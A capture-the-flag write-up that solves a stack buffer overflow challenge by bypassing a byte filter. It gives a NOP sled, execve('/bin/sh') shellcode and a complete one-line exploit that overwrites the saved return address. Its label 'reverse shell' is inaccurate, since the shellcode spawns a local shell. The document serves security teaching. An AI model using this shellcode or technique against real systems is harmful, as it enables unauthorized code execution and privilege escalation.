# mission2
## Goal and instructions
Connect to bin.chall.necst.it port 22 via SSH as user [USERNAME]. You will find the files in /home/[USERNAME]/mission2.

Your goal is to read the file flag with the privileges of the group that owns the vulnerable binary.

## compiled options
The executable program is compiled in 32bit, the stack is executable and the canary is inactive.
```
gcc -fno-stack-protector -m32 -no-pie -O0 -z execstack -o mission2 mission2.c
```
## Code overview
The code for this challenge does not specify particular constraints on the string in input and does not check the input length, ad so it is vulnerable to overflow.
However the executable will verify, in the first 128 characters of the buffer (length 180), the absence of special characters as shown in the following function:
```
void check(char* buf) {
    // 0xb = execve
    // 0x5 = open
    for (int i = 0; i < 128; i++) {
        if (buf[i] == 0x0b || buf[i] == 0x05) {
            puts("You dirty hacker!");
            exit(0);
        } 
    }        
}
```

## Solution
The exploit is a classical [reverse shell attack](https://www.imperva.com/learn/application-security/reverse-shell/), the goal is to open a shell with the same privileges as the vulnerable binary and to execute *cat flag* from that shell.
To achieve it we need to include in the buffer an assembly code to open the shell and to overwrite the saved EIP (through overflow) with the address of our assembly code.
> **note:** we can't know precisely the shell code address, we will include a NOP Sled in the buffer and point in the middle of it.

In order to write a valid exploit it is necessary to:
* Use gdb to identify the buffer address on the stack, a way to do it is to fill it with 'A' and search for 0x41 on the stack as follows.
    * Use Python to save a string with 180 'A' in a file.
        ```
        python -c "print 'A' * 180 +'BBBB' " > ./writable/input.txt
        ```
    * Open gdb and set a breakpoint just after the executable reads the input string.
    * Run the executable with the file just created as input.
    * Print the stack and take note of the address.
        ```
        x/200xb $esp
        ```
* Include shell code in the buffer (in hex), a working example is provided below:
    ```
    \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
    ```
    > **note:** verify the shell code is short enough to overcome the check function.

* Size correctly the NOP Sled to overwrite the saved EIP, changing the number of NOP in the following code until we have write "AAAA" in EBP + 4
    ```
    python -c "print '\x90' * 147 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'AAAA'"  > ./writable/input.txt
    ```
* Get an address in the middle of the NOP Sled and replace 'AAAA' with it, returning from the muda() function the processor will jump in the stack executing the NOP operation and so the shell code. Following is provided the complete exploit.
    ```
    (python -c "print '\x90' * 147 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\xb0\xdd\xff\xff'"; cat - ) | env -i /home/[USERNAME]/mission2/mission2
    ```